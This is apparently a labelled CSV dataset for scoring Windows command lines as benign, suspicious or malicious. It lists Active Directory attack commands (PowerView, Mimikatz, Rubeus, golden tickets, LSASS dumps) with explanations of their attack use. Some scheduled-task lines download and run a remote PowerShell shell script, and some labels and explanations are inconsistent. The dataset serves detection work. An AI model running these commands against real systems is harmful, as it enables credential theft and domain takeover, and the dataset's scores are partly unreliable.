prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
"powershell Get-DomainGroup ""Domain Admins""","Potential use: Enumeration of privileged accounts.
What it does: Retrieves the members of the ""Domain Admins"" group in the current domain using PowerShell.",powershell,Domain Admins,none,none,none,Get-DomainGroup,none,0.55,suspicious
"powershell Get-DomainGroupMember ""Domain Admins"" | select -ExpandProperty membername","This command can be used to enumerate all members of the ""Domain Admins"" group in a Windows domain, which can be useful for lateral movement and privilege escalation in a cyberattack.",powershell,Domain Admins,none,none,none,"Get-DomainGroupMember,select,-ExpandProperty",none,0.55,suspicious
powershell Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC,This command can be used to find network shares on a Windows machine and can be used in a cyberattack to identify potential targets for lateral movement or data exfiltration.,powershell,none,none,none,none,"Find-DomainShare,-ExcludeStandard,-ExcludePrint,-ExcludeIPC",none,0.15,benign
powershell Get-DomainOU -FullData,"Potential use: Reconnaissance.

What it does: Retrieves detailed information about all Organizational Units (OUs) in a domain, including their names, descriptions, distinguished names, and security descriptors.",powershell,none,none,none,none,"Get-DomainOU,-FullData",none,0.15,benign
powershell Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname,This command can be used to enumerate all the domain-joined servers in an Active Directory environment and retrieve their hostnames. It can be used for reconnaissance purposes in a cyberattack.,powershell,Get-DomainComputer -SearchBase $_.distinguishedname,none,none,none,"Get-DomainOU,-name,select",none,0.55,suspicious
powershell Get-DomainOU *WS* | select gplink,"This command can be used to enumerate all Organizational Units (OUs) in a domain that contain ""WS"" in their name and retrieve the Group Policy Links (GPLink) associated with them. This information can be used to identify potential targets for lateral movement or privilege escalation.",powershell,gplink,none,none,none,Get-DomainOU,none,0.55,suspicious
"powershell Get-DomainGPO -Name ""{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}""","Potential use: Enumeration of Group Policy Objects (GPOs) for lateral movement and privilege escalation.

What it does: Retrieves the specified GPO by name from the domain and displays its properties.",powershell,none,none,3E04167E-C2B6-4A9A-8FB7-C811158DC97C,none,Get-DomainGPO,none,0.25,benign
powershell Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName,This command can be used to enumerate the members of a local group in a Group Policy Object (GPO) and can be used in a cyberattack to gather information about the target machine's local group membership.,powershell,GPODisplayName,none,none,none,"Get-DomainGPOLocalGroup,-ResolveMembersToSIDs",none,0.55,suspicious
"powershell Get-DomainObjectAcl -SearchBase ""CN=Policies","This command can be used to retrieve the access control list (ACL) of a domain object in Active Directory, which can be useful for identifying potential vulnerabilities or weaknesses in the system.",powershell,CN=Policies,none,none,none,"Get-DomainObjectAcl,-SearchBase",none,0.55,suspicious
"powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq ""GP-Link"" -and $_.ActiveDirectoryRights -match ""WriteProperty"" } | select ObjectDN","This command can be used to find Group Policy Objects (GPOs) that have write permissions, which can be abused to modify GPOs and potentially execute code or escalate privileges on a Windows machine.",powershell,"$_.ObjectAceType -eq ""GP-Link"" -and $_.ActiveDirectoryRights -match ""WriteProperty",none,none,none,"Get-DomainOU,Get-DomainObjectAcl,-ResolveGUIDs,select",none,0.55,suspicious
"powershell Get-DomainObjectAcl -SamAccountName ""Domain Admins"" -ResolveGUIDs | Select IdentityReference","This command can be used to retrieve the access control list (ACL) of the ""Domain Admins"" group and potentially identify privileged accounts in a Windows domain environment.",powershell,Domain Admins,none,none,none,"Get-DomainObjectAcl,-ResolveGUIDs,select",none,0.55,suspicious
powershell Find-InterestingDomainAcl | select identityreferencename,"Potential use: Enumeration of domain permissions and users.
What it does: Uses PowerShell to search for interesting domain ACLs and selects the identity reference name.",powershell,none,none,none,none,"Find-InterestingDomainAcl,select",none,0.15,benign
"powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match ""Domain Admins""} | select ObjectDN","This command can be used to find interesting domain ACLs and extract the distinguished name of the objects that have the ""Domain Admins"" group in their ACLs.",powershell,"$_.IdentityReference -match ""Domain Admins""",none,none,none,"Find-InterestingDomainAcl,-ResolveGUIDs,select",none,0.55,suspicious
powershell Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections,"This command can be used to retrieve the AppLocker policy and its rule collections, which can be useful for an attacker to understand the restrictions in place and potentially bypass them.",powershell,none,none,none,none,"Get-AppLockerPolicy,-Effective,select,-ExpandProperty",none,0.15,benign
"powershell Get-AppLockerPolicy -Domain -LDAP ""LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF}",This command can be used to retrieve the AppLocker policy from a remote domain controller and potentially identify any restrictions or permissions on application execution within the target domain.,powershell,LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},none,LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},targetdomain.com,"Get-AppLockerPolicy,-Domain,-LDAP",none,0.75,malicious
"powershell Get-AppLockerPolicy -Domain -LDAP ""LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF}",This command can be used to retrieve the AppLocker policy from a remote domain controller and can be used to gather information about the application whitelisting policy in place on the target machine.,powershell,LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},none,LDAP://10.10.10.11/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},10.10.10.11,"Get-AppLockerPolicy,-Domain,-LDAP",none,0.75,malicious
powershell Get-DomainComputer -identity LAPS-COMPUTER -properties ms-Mcs-AdmPwd,"This command can be used to retrieve the Local Administrator Password Solution (LAPS) password for a specific computer in a domain, which can be useful for privilege escalation or lateral movement in a cyberattack on a Windows machine.",powershell,ms-Mcs-AdmPwd,none,LAPS-COMPUTER,none,Get-DomainComputer,none,0.65,malicious
powershell Find-LocalAdminAccess,"Potential use: Identify local administrator accounts on a compromised machine.
What it does: Searches for local administrator accounts on the machine using PowerShell.",powershell,none,none,none,none,Find-LocalAdminAccess,none,0.15,benign
powershell Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True },"This command can be used to find the location of domain users with local admin access on a Windows machine, which can be useful for privilege escalation in a cyberattack.",powershell,$_.LocalAdmin -Eq True ,none,none,none,"Find-DomainUserLocation,-CheckAccess",none,0.55,suspicious
powershell Get-DomainUser -SPN | select name,"Potential use: Enumeration of domain users with Service Principal Names (SPNs) for Kerberos attacks.
What it does: Retrieves a list of domain users with SPNs and selects their names for output.",powershell,none,none,none,none,"Get-DomainUser,-SPN,select",none,0.15,benign
powershell Get-DomainUser -PreauthNotRequired | select name,"Potential use in a cyberattack: Enumeration of domain users who do not require pre-authentication, which can aid in password cracking or lateral movement.

What it might do on a Windows machine: Executes a PowerShell cmdlet to retrieve a list of domain users who do not require pre-authentication and selects their names for output.",powershell,none,none,none,none,"Get-DomainUser,-PreauthNotRequired,select",none,0.15,benign
"powershell Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match ""RDPUsers""}",This command can be used to find interesting domain ACLs related to RDPUsers group and resolve their GUIDs in PowerShell on a Windows machine.,powershell,"$_.IdentityReferenceName -match ""RDPUsers""",none,none,none,"Find-InterestingDomainAcl,-ResolveGUIDs",none,0.55,suspicious
powershell Get-DomainComputer -Unconstrained,"Potential use: Enumeration of domain computers.
What it does: Retrieves a list of domain computers that are not constrained by the default security settings.",powershell,none,none,none,none,"Get-DomainComputer,-Unconstrained",none,0.15,benign
powershell Get-DomainUser -TrustedToAuth | select userprincipalname,"Potential use: Enumeration of domain users.
What it does: Retrieves a list of domain users that are trusted for delegation and selects their user principal names.",powershell,none,none,none,none,"Get-DomainUser,-TrustedToAuth,select",none,0.15,benign
powershell Get-DomainComputer -TrustedToAuth | select name,"Potential use in a cyberattack: Enumeration of domain computers for lateral movement.

What it might do on a Windows machine: Retrieves a list of domain computers that have the ""TrustedToAuth"" flag set and selects the name property for display.",powershell,none,none,none,none,"Get-DomainComputer,-TrustedToAuth,select",none,0.15,benign
powershell Invoke-BloodHound -CollectionMethod All,"This command can be used to gather information about the network and identify potential attack paths, and it will collect data from all available methods in BloodHound on a Windows machine.",powershell,none,none,none,none,"Invoke-BloodHound,-CollectionMethod,All",none,0.15,benign
powershell Invoke-BloodHound -CollectionMethod LoggedOn,"This command can be used to gather information about the network and identify potential attack paths by querying the Active Directory and mapping out the relationships between users, groups, and computers that are currently logged on to the network.",powershell,none,none,none,none,"Invoke-BloodHound,-CollectionMethod,LoggedOn",none,0.15,benign
powershell SharpHound.ps1,"Potential use: Collects information about Active Directory for reconnaissance purposes.
On a Windows machine: Executes a PowerShell script that can gather information about the Active Directory environment.",powershell,none,none,none,none,SharpHound.ps1,none,0.15,benign
SharpHound.exe,"SharpHound.exe is a tool used for Active Directory reconnaissance and can be used to gather information about users, groups, computers, and other objects in the domain.",SharpHound.exe,SharpHound.exe,none,none,none,none,none,0.45,suspicious
"powershell Get-DomainSPNTicket -SPN ""MSSQLSvc/sqlserver.targetdomain.com""",This command can be used to obtain a Kerberos ticket-granting ticket (TGT) for a specified service principal name (SPN) and can be used in a Pass-the-Ticket attack to gain access to other resources on the network.,powershell,MSSQLSvc/sqlserver.targetdomain.com,none,none,targetdomain.com,"Get-DomainSPNTicket,-SPN",none,0.65,malicious
"powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""MSSQLSvc/sqlserver.targetdomain.com""",This command can be used to create a Kerberos token for a specific service principal name (SPN) and can be used in a cyberattack to authenticate to a target SQL server in a Windows domain.,powershell,System.IdentityModel.Tokens.KerberosRequestorSecurityToken,none,MSSQLSvc/sqlserver.targetdomain.com,targetdomain.com,"New-Object,-ArgumentList",none,0.75,malicious
"powershell Invoke-Mimikatz -Command '""kerberos::list /export""'",This command can be used to extract Kerberos tickets from memory and can be used in a cyberattack to perform pass-the-hash attacks on other machines in the network.,powershell,kerberos::list,none,none,none,"Invoke-Mimikatz,-Command,/export",none,0.55,suspicious
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi,This command could be used to crack passwords in a cyberattack and gain access to a Windows machine.,none,.\10k-worst-pass.txt,none,.\mssqlsvc.kirbi,none,none,none,0.5,suspicious
powershell Invoke-TokenManipulation -Enumerate,"This command can be used to enumerate all available tokens on a Windows machine, which can be useful for privilege escalation in a cyberattack.",powershell,none,none,none,none,"Invoke-TokenManipulation,-Enumerate",none,0.15,benign
"powershell Invoke-TokenManipulation -ImpersonateUser -Username ""domain\user""","This command can be used to impersonate a user and gain access to their privileges, allowing an attacker to move laterally within a network and potentially escalate their privileges.",powershell,domain\user,none,none,none,"Invoke-TokenManipulation,-ImpersonateUser",none,0.55,suspicious
"powershell Invoke-TokenManipulation -CreateProcess ""C:\Windows\system32\calc.exe"" -ProcessId 500","This command can be used to create a new process with elevated privileges and execute a malicious payload, in this case, launching the calculator application with the process ID of 500.",powershell,C:\Windows\system32\calc.exe,none,none,none,"Invoke-TokenManipulation,-CreateProcess,-ProcessId",none,0.55,suspicious
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the Administrator account using an RC4 hash of the account's NTLM password, and then inject the resulting ticket into the current user's Kerberos ticket cache for lateral movement.",none,/rc4:[NTLMHASH],none,none,none,"Rubeus.exe,asktgt,/ptt",none,0.5,suspicious
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the Administrator account using an AES256 hash, and can be used in a cyberattack to gain access to sensitive information on a Windows machine. The /opsec flag is used to bypass security measures, and the /ptt flag is used to execute the ticket in memory without writing to disk.",none,/aes256:[AES256HASH],none,none,none,"Rubeus.exe,asktgt,/opsec,/ptt",none,0.5,suspicious
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe,"This command can be used to obtain a Kerberos ticket-granting ticket (TGT) for the Administrator account using a precomputed NTLM hash, and then launch a new command prompt with the TGT in a network-only context, allowing an attacker to execute commands with elevated privileges without leaving traces on the local machine.",cmd.exe,/rc4:[NTLMHASH],none,C:\Windows\System32\cmd.exe,none,"Rubeus.exe,asktgt,/createnetonly",none,0.65,malicious
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe,"This command can be used to pass-the-hash and impersonate the Administrator account on a target domain, allowing the attacker to run PowerShell with elevated privileges on the compromised machine.",powershell.exe,/ntlm:[NTLMHASH],none,targetdomain.com,targetdomain.com,/run,none,0.75,malicious
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,"This command can be used to create a golden ticket for the target domain with the specified user, domain, and SID, using the KRBTGT hash and granting the user ID 500 and group 513 privileges.",none,kerberos::golden,none,targetdomain.com,targetdomain.com,"/sid:S-1-5-21-[DOMAINSID],/krbtgt:[KRBTGTHASH]",none,0.7,malicious
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,"This command can be used to create a golden ticket for the Administrator account in the target domain, allowing the attacker to authenticate as that user and access resources in the domain.",none,kerberos::golden,none,targetdomain.com,dc.targetdomain.com,"/sid:S-1-5-21-[DOMAINSID],/rc4:[MACHINEACCOUNTHASH],/service",none,0.7,malicious
mimikatz.exe,"Can be used to extract plaintext passwords, hashes, and Kerberos tickets from memory on a Windows machine.",none,mimikatz.exe,none,none,none,none,none,0.4,suspicious
"schtasks /create /tn ""shell"" /ru ""NT Authority\SYSTEM"" /s dc.targetdomain.com /sc weekly /tr ""Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'""","This command creates a scheduled task named ""shell"" that runs weekly, downloads and executes a PowerShell script from a remote server, and runs it as the SYSTEM user. 

Potential uses in a cyberattack for 'living off the land': 
- Establishing persistence on a compromised machine by scheduling the execution of a malicious script.
- Downloading and executing additional malware or tools from a remote server.
- Running the malicious script with SYSTEM privileges to bypass security controls and gain full access to the system.",schtasks,New-Object Net.WebClient,none,http://172.16.100.55/Invoke-PowerShellTcpRun.ps1,dc.targetdomain.com,"/create,/tn,/ru,/s,/sc,/tr,IEX",none,0.75,malicious
"schtasks /create /tn ""shell"" /ru ""NT Authority\SYSTEM"" /s 10.10.10.10 /sc weekly /tr ""Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'""","This command creates a scheduled task named ""shell"" that runs weekly, downloads and executes a PowerShell script from a remote server, and runs it as the SYSTEM user. 

Potential use in a cyberattack: Establishing persistence and remote access to a compromised machine.",schtasks,New-Object Net.WebClient,none,http://172.16.100.55/Invoke-PowerShellTcpRun.ps1,10.10.10.10,"/create,/tn,/ru,/s,/sc,/tr,IEX",none,0.75,malicious
"schtasks /RUN /TN ""shell"" /s dc.targetdomain.com","This command can be used to execute a scheduled task named ""shell"" on a remote machine ""dc.targetdomain.com"" and can be used to run malicious code or commands on the target machine.",schtasks,shell,none,none,dc.targetdomain.com,"/RUN,/TN,/s",none,0.65,malicious
"schtasks /RUN /TN ""shell"" /s 10.10.10.10","This command can be used to execute a scheduled task named ""shell"" on a remote machine with IP address 10.10.10.10, potentially allowing an attacker to run malicious code or commands on the target machine.",schtasks,shell,none,none,10.10.10.10,"/RUN,/TN,/s",none,0.65,malicious
"powershell Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist ""powershell.exe -e $encodedCommand""","This command can be used to remotely execute a PowerShell script encoded in Base64 on a target machine using WMI, allowing an attacker to execute arbitrary code on the target machine.",powershell,$encodedCommand,powershell,none,dc.targetdomain.com,"Invoke-WmiMethod,create,-argumentlist",none,0.85,malicious
"powershell Invoke-WmiMethod win32_process -ComputerName 10.10.10.10 -name create -argumentlist ""powershell.exe -e $encodedCommand""","This command can be used to remotely execute PowerShell code on a target machine using WMI, allowing an attacker to run malicious code without needing to drop any files on the target machine.",powershell,$encodedCommand,powershell,none,10.10.10.10,"Invoke-WmiMethod,create,-argumentlist",none,0.85,malicious
powershell $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN/targetuser',"This command can be used to create a new PowerShell credential object for a specified domain user, which can then be used to execute commands or scripts with the privileges of that user.",powershell,System.Management.Automation.PSCredential,none,DOMAIN/targetuser,none,New-Object,none,0.65,malicious
powershell Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname},This command can be used to remotely execute commands on a target machine using PowerShell and can be used to gather information about the target machine such as the current user and hostname.,powershell,whoami,none,dc.targetdomain.com,dc.targetdomain.com,Invoke-Command,none,0.75,malicious
powershell Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser,"This command can be used to establish a remote PowerShell session with a domain controller in the target domain using the credentials of a specific user, allowing an attacker to execute commands and perform reconnaissance on the target network.",powershell,DOMAIN/targetuser,none,dc.targetdomain.com,dc.targetdomain.com,Enter-PsSession,none,0.75,malicious
powershell $sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com,"This command can be used to establish a new PowerShell session with a remote computer in the target domain using specified credentials, which can be used to execute commands on the remote machine.",powershell,$Cred,none,dc.targetdomain.com,dc.targetdomain.com,New-PsSession,none,0.75,malicious
"powershell Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination ""C:\Users\public\""","This command can be used to copy the Invoke-Mimikatz PowerShell script to a remote session and save it to the public folder on the target machine, allowing an attacker to execute the script and potentially extract credentials from memory.",poweshell,C:\Users\public\,none,.\Invoke-Mimikatz.ps1,none,Copy-Item,none,0.65,malicious
.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com,This command can be used to remotely execute code on a target machine and potentially gain access to sensitive information or control over the system.,MS-RPRN.exe,unconstrained-server.targetdomain.com,none,dc.targetdomain.com,unconstrained-server.targetdomain.com,none,none,0.65,malicious
.\MS-RPRN.exe \\dc.targetdomain.com \\10.10.10.10,This command can be used to remotely execute code on a target machine and potentially gain access to sensitive information or control over the system.,MS-RPRN.exe,10.10.10.10,none,dc.targetdomain.com,10.10.10.10,none,none,0.65,malicious
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the specified user with delegated privileges, potentially allowing an attacker to move laterally within the target domain using the stolen TGT.",none,/rc4:2892D26CDF84D7A70E2EB3B9F05C425E,none,targetdomain.com,targetdomain.com,asktgt,none,0.7,malicious
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:10.10.10.10 /rc4:2892D26CDF84D7A70E2EB3B9F05C425E,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for a specified user with delegation privileges in a specified domain, potentially allowing an attacker to escalate privileges and move laterally within the network.",none,/rc4:2892D26CDF84D7A70E2EB3B9F05C425E,none,10.10.10.10,10.10.10.10,asktgt,none,0.7,malicious
kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi,"This command can be used to create a golden ticket attack by forging a Kerberos ticket-granting ticket (TGT) for the target domain using the compromised domain's SID and RC4 hash, allowing the attacker to impersonate any user or service in the target domain.",none,kerberos::golden,none,c:\users\public\ticket.kirbi,currentdomain.targetdomain.com,"/sid,/sids,/rc4,/service,/target,/ticket",none,0.7,malicious
kerberos::golden /domain:10.10.10.10 /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi,"This command can be used to create a golden ticket attack by forging a Kerberos ticket-granting ticket (TGT) for the target domain using the hash of the KRBTGT account and the SID of the target domain, allowing the attacker to impersonate any user in the target domain.",none,kerberos::golden,none,c:\users\public\ticket.kirbi,10.10.10.10,"/sid,/sids,/rc4,/service,/target,/ticket",none,0.7,malicious
"SharpGPOAbuse.exe --AddComputerTask --TaskName ""Microsoft LEGITIMATE Hotfix"" --Author NT AUTHORITY\SYSTEM --Command ""cmd.exe"" --Arguments ""/c start calc.exe"" --GPOName ""Totally Legit GPO""","This command can be used to add a malicious task to a legitimate GPO, which when executed on a Windows machine, will launch the calculator application as a proof of concept.", none,/c start calc.exe,none,AUTHORITY\SYSTEM,none,"--AddComputerTask,--Command",none,0.6,malicious
"powershell Add-ObjectACL -TargetDistinguishedName ""dc=targetdomain","This command can be used to add an Access Control List (ACL) to a target object in Active Directory, potentially allowing an attacker to gain unauthorized access to sensitive information or systems within the target domain.",powershell,TargetDistinguishedName,none,none,targetdomain,Add-ObjectACL,none,0.65,malicious
powershell Set-RemotePSRemoting -UserName BackdoorUser -ComputerName dc.targetdomain.com,"This command can be used to enable remote PowerShell remoting on a target machine, allowing an attacker to remotely execute commands and potentially establish persistence on the compromised system.",powershell,none,none,none,dc.targetdomain.com,Set-RemotePSRemoting,none,0.25,benign
powershell Set-RemoteWMI -UserName BackdoorUser -ComputerName dc.targetdomain.com -namespace 'root\cimv2',This command can be used to remotely set up a backdoor user account on a target domain controller machine using Windows Management Instrumentation (WMI).,powershell,none,none,none,dc.targetdomain.com,Set-RemoteWMI,none,0.25,benign
"powershell Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name ""RunAsPPL""","This command can be used to check if the ""RunAsPPL"" registry value is enabled, which can be leveraged in a cyberattack to bypass User Account Control (UAC) and gain elevated privileges on a Windows machine.",powershell,HKLM:\SYSTEM\CurrentControlSet\Control\Lsa,none,HKLM:\SYSTEM\CurrentControlSet\Control\Lsa,none,Get-ItemProperty ,none,0.65,malicious
.\procdump.exe -r -ma lsass.exe lsass.dmp,"This command can be used to dump the memory of the LSASS process, which contains sensitive information such as passwords and credentials, and can be used for further analysis or exploitation.",procdump.exe,lsass.dmp,none,lsass.exe,none,"-r,-ma",none,0.65,malicious
.\procdump.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens.",procdump.exe,firefox.dmp,none,firefox.exe,none,"-r,-ma",none,0.65,malicious
.\procdumpx86.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens.",procdumpx86.exe,firefox.dmp,none,firefox.exe,none,"-r,-ma",none,0.65,malicious
.\procdumpx64.exe -r -ma firefox.exe firefox.dmp,"This command can be used to dump the memory of a running Firefox process, potentially allowing an attacker to extract sensitive information such as passwords or session tokens.",procdumpx64.exe,firefox.dmp,none,firefox.exe,none,"-r,-ma",none,0.65,malicious
reg.exe save hklm\security c:\users\public\downloads\security.save,"This command can be used to save the security hive of the Windows Registry to a file, which can then be exfiltrated by an attacker for further analysis or exploitation.",reg.exe,c:\users\public\downloads\security.save,none,hklm\security,none,save,none,0.65,malicious
wmic shadowcopy call create Volume='C:\',"This command can be used to create a shadow copy of the C:\ volume, which can be used to backup or restore files, but can also be used by an attacker to access and copy sensitive data without being detected.",wmic,C:\,none,shadowcopy,none,create,none,0.65,malicious
.\chisel.exe client 192.168.49.67:80 R:socks,"This command can be used to establish a SOCKS proxy connection to a remote server, which can be used to bypass network restrictions and exfiltrate data from a compromised machine.",none,chisel.exe,none,none,192.168.49.67:80,"client,R:socks",none,0.6,malicious
.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>,"This command can be used to collect information about the domain and its users, groups, computers, and other objects, which can be used for reconnaissance and privilege escalation in a cyberattack. It will run the SharpHound tool with the specified collection method, LDAP credentials, domain information, and output directory.",none,PathToFile,none,Domain,none,"--CollectionMethod,--domaincontroller,--OutputDirectory",none,0.6,malicious
. .\SharpHound.ps1,"This command executes the SharpHound PowerShell script, which can be used to gather information about Active Directory environments for reconnaissance purposes in a cyberattack.",none,none,none,none,none,SharpHound.ps1,none,0.1,benign
powershell Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>,"This command can be used to collect information about Active Directory and its relationships, which can be used to plan and execute a privilege escalation attack. It will output the collected data to a specified directory.",powershell,PathToFile,none,none,none,"Invoke-BloodHound,--CollectionMethod,--OutputDirectory",none,0.55,suspicious
powershell Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess,"This command can be used to remotely execute a PowerShell script on a target machine using a specified credential and session, which can be useful for lateral movement and executing malicious code on a compromised machine.",powershell,c:\FilePath\file.ps1,none,$cred,none,"-Credential,-Session",none,0.65,malicious
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>,"This command can be used to perform pass-the-hash attacks by impersonating a user and obtaining their NTLM hash, allowing an attacker to authenticate as that user without knowing their password.",none,/ntlm:<>,none,/domain:<DomainFQDN>,none,"mimikatz,sekurlsa::pth",none,0.6,malicious
mimikatz sekurlsa::minidump c:\temp\lsass.dmp,This command can be used to extract plaintext passwords from the memory of a Windows machine and can be used in a Pass-the-Hash attack.,none,sekurlsa::minidump,none,c:\temp\lsass.dmp,none,mimikatz,none,0.6,malicious
"powershell Invoke-Mimikatz -Command '""kerberos::list /export""'",This command can be used to extract Kerberos tickets from memory and can be used in a cyberattack to perform pass-the-hash attacks on other machines in the network.,powershell,kerberos::list,none,none,none,"Invoke-Mimikatz,/export",none,0.55,suspicious
powershell Invoke-Kerberoast,"Can be used to extract Kerberos tickets and crack them offline, potentially leading to privilege escalation.",powershell,none,none,none,none,Invoke-Kerberoast,none,0.15,benign
powershell Get-NetUser -SPN,"Potential use: Enumeration of user accounts and their Service Principal Names (SPNs) for Kerberos authentication.
What it does: Retrieves a list of user accounts and their associated SPNs from the local or remote Windows machine using PowerShell.",powershell,none,none,none,none,"Get-NetUser,-SPN",none,0.15,benign
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>,"This command can be used to perform a Kerberoasting attack and extract Kerberos tickets for user accounts in the specified domain, with the output saved to a file.",none, /outfile:<fileName>,none,/domain:<DomainName>,none,kerberoast,none,0.6,malicious
vssadmin list shadows,"Potential use: Finding and accessing shadow copies of files for data exfiltration or recovery.
What it does: Lists all shadow copies of files on the system.",none,none,none,none,none,list,none,0.1,benign
diskshadow list shadows all,"Potential use in a cyberattack: Checking for the presence of shadow copies to delete them and hinder recovery efforts.
What it does on a Windows machine: Lists all available shadow copies on the system.",diskshadow,none,none,none,none,"list,all",none,0.15,benign
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\,"This command creates a symbolic link to the shadow copy of a hard disk volume, which could be used to access and exfiltrate sensitive data from a compromised system.",none,\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\,none,c:\shadowcopy,none,/d,none,0.6,malicious
